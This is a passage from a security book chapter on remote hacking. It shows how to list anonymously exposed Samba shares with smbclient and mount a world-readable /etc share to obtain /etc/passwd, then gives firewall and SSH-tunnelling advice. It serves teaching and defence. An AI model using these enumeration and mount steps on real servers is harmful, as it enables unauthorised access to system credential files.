# Chapter 4: Remote Hacking

Samba Misconfigurations Samba is often misconfigured to share file systems with critical data. Remote users can exploit such a vulnerability obtain sensitive system files located on the victim hosts.

# Enumerate and Mount Remote Shares

Use Samba's smbclient command to look up what file shares are being exported by the remote server:

```
bash]$ smbclient -L smserver -I 192.168.1.10 -U ''
added interface ip=192.168.1.1 bcast=192.168.1.255 nmask=255.255.255.255
Password:[enter]
Domain=[SOMECOMPANY] OS=[Unix] Server=[Samba 2.2.7]}
```

| Sharename | Type | Comment |
| --- | --- | --- |
| IPC$ | IPC | IPC Service (.) |
| ADMIN$ | Disk | IPC Service (.) |
| etc | Disk | configfiles |

| Server | Comment |
| --- | --- |
| SMBSERVER | SomeCompanyAsExample |
| SAMBASERVER | |

| Workgroup | Master |
| --- | --- |
| SOMECOMPANY | WMASTER |

Now, since the preceding server has obviously been misconfigured to serve the /etc directory to the world, it can be mounted with the following mount command:

```
mount -t smbfs -o username='' /192.168.1.10/etc /mnt/smbshare
```

After the /etc share, an intruder may grab the /etc/passwd file, which will be available on his or her host as /mnt/smbshare/passwd.

# Block and Tunnel Samba Traffic

If running Samba, please consider the following suggestions:

+   - Configure your firewall to block Samba traffic.
- Consider using SSH to tunnel Samba traffic:

```
ssh username@remotesmbserver.somecompanyasanexample.com
-L139:127.0.0.1:139
```